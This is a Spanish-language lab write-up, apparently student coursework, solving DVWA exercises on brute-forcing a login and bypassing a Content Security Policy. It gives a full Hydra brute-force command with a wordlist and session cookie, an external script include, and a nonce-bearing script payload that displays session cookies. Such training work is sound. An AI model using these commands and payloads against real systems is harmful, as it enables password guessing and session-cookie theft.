# 🛡️ Vulnerabilidades en la autenticación y autorización

# 🛡️ Brute Force
## LOW y MEDIUM
## 📋 Explicación
Para resolver este, ejecutamos este comando de Hydra que hace un ataque de fuerza bruta web contra DVWA en el módulo de Brute Force, enviando peticiones HTTP GET para intentar descubrir la contraseña del usuario admin.

## 🖥️ Payload ejecutado
```bash
hydra -l admin -P /home/alfonso/rockyou.txt 127.0.0.1 http-get-form "/DVWA/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect." -m "Cookie: security=low; PHPSESSID=ibok9bdioj4f4o4oib178plrse"
```
## 📸 Captura de pantalla
![a2dismod](https://github.com/PPS10711021/RA3/blob/main/RA3/RA3_2/images/brute1.png)

# 🛡️ Content Security Policy (CSP) Bypass
## LOW
## 📋 Explicación
Logramos evadir las restricciones de seguridad CSP cargando un script externo (alert.js) desde digi.ninja, este script nos lo proporciona el propio DVWA.

El resultado es que aparece un popup que dice "CSP Bypassed", demostrando que la protección CSP fue saltada y se pudo ejecutar código externo.

## 🖥️ Payload ejecutado
```bash
https://digi.ninja/dvwa/alert.js
```
## 📸 Captura de pantalla
![a2dismod](https://github.com/PPS10711021/RA3/blob/main/RA3/RA3_2/images/csp1.png)

## MEDIUM
## 📋 Explicación
En este caso, inyectamos el comando de abajo, al hacerlo hace que DVWA muestre un popup enseñando el nivel de seguridad y tus cookies de sesión.

## 🖥️ Payload ejecutado
```bash
<script nonce="TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=">alert(document.cookie)</script>
```
## 📸 Captura de pantalla
![a2dismod](https://github.com/PPS10711021/RA3/blob/main/RA3/RA3_2/images/csp2.png)
